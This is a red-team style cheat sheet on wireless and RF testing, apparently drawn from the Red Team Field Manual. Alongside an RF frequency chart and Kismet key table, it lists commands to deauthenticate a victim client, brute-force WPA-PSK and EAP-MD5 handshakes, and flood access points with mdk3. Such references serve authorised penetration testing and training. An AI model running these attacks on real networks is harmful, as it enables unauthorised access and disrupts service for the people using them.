---
name: Wireless & RF
category: Traffic Analysis & Wireless
description: RF frequency chart, Wi-Fi commands, Bluetooth, Kismet reference and Wi-Fi testing/DoS.
tags: [wireless, wifi, bluetooth, rf, kismet, aircrack, RTFM]
---

# Wireless & RF

RF frequencies, Wi-Fi commands, Bluetooth and wireless testing reference.

## RF frequency chart

| Frequency | Technology |
|-----------|------------|
| 125-134 kHz | RFID (LF) |
| 13.56 MHz | RFID (HF) |
| 315 MHz | Keyless Entry (N. Am) |
| 433.92 MHz | Keyless Entry (EU/Asia) |
| 868 MHz | ZigBee (EU) |
| 915 MHz | ZigBee (US) |
| 2.4 GHz | 802.11b/g, Bluetooth, ZigBee |
| 5.0 GHz | 802.11a/n |

## Linux Wi-Fi commands

```bash
iwconfig
rfkill list
rfkill unblock all
airodump-ng <IFACE>

# Connect to unsecured Wi-Fi
iwconfig ath0 essid <BSSID>
ifconfig ath0 up
dhclient ath0

# Connect to WEP
iwconfig ath0 essid <BSSID> key <WEP_KEY>
ifconfig ath0 up
dhclient ath0
```

## Wi-Fi testing

```bash
airmon-ng stop <IFACE>
airmon-ng start <IFACE>
iwconfig <IFACE> channel <CH>
airodump-ng -c <CH> --bssid <BSSID> -w file <OUT>
aireplay-ng -0 10 -a <BSSID> -c <VICTIM_MAC> <IFACE>

# Brute force WPA-PSK
aircrack-ng -w <WORDLIST> <HANDSHAKE_FILE>

# EAP-MD5
eapmd5pass -r <HANDSHAKE_FILE> -w <WORDLIST>
```

## Wi-Fi DoS

```bash
mdk3 <IFACE> a -a <BSSID>           # Auth flood
mdk3 <IFACE> b -c <CHANNEL>         # Beacon flood
```

## Linux Bluetooth

```bash
hciconfig <IFACE> up
hcitool -i <IFACE> scan --flush --all
sdptool browse <IFACE>
hciconfig <IFACE> name "<NAME>" class 0x520204 piscan
pand -K
```

## Kismet keys

| Key | Action |
|-----|--------|
| `e` | List servers |
| `h` | Help |
| `z` | Toggle full-screen |
| `n` | Name network |
| `i` | Detailed info |
| `s` | Sort networks |
| `l` | Power levels |
| `d` | Dump strings |
| `c` | Show clients |
| `L` | Lock channel |
| `H` | Normal hopping |
| `Q` | Quit |

> Source: RTFM — Red Team Field Manual v2. See also [aircrack-ng](#/tool/aircrack-ng).
